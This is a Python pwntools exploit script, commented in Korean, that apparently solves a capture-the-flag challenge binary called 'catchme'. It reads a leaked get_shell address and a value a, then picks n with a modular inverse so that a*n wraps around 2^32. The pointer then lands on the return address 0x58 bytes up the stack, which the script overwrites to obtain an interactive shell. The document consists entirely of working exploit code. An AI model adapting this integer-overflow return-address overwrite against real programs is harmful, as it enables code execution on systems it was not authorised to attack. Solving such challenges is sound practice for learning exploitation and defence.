from pwn import *

# context 설정
context.arch = 'amd64'

# 바이너리 로드
# elf = ELF('./catchme')
p = process('./catchme')
# p = remote('localhost', 15252)

# get_shell 주소 읽기
get_shell_line = p.recvline()
get_shell_addr = int(get_shell_line.strip().split(b' = ')[1], 16)
log.success(f"get_shell addr = {hex(get_shell_addr)}")

offset_to_ret = 0x58 # stack 크기 0x50 + ret offset = 0x58
M = 2**32 # unsigned int의 최대값

# void *p 의 위치를 ret address로 옮겨 get_shell 주소로 덮어야 한다.
# p = buf + (a*n) 에서 a*n을 overflow 시키는 것이 핵심
# n 구하기: a * n ≡ 0x58 mod 2^32 → n ≡ 0x58 * a⁻¹ mod 2^32
# 문제에서 a는 항상 홀수이므로 a⁻¹는 항상 존재한다.
get_a_line = p.recvline()
get_a_val = int(get_a_line.strip().split(b' = ')[1])
log.success(f"get_a_val = {get_a_val}")
inv_a = pow(get_a_val, -1, M)
n = (offset_to_ret * inv_a) % M # 3681400552
log.info(f"calculated n = {n}")

# n 입력
p.sendlineafter(b"input n: ", str(n).encode())

# get_shell 주소를 리틀엔디안으로 입력
payload = p64(get_shell_addr)
p.sendafter(b"input 8 bytes: ", payload)

# 인터랙티브 쉘
p.interactive()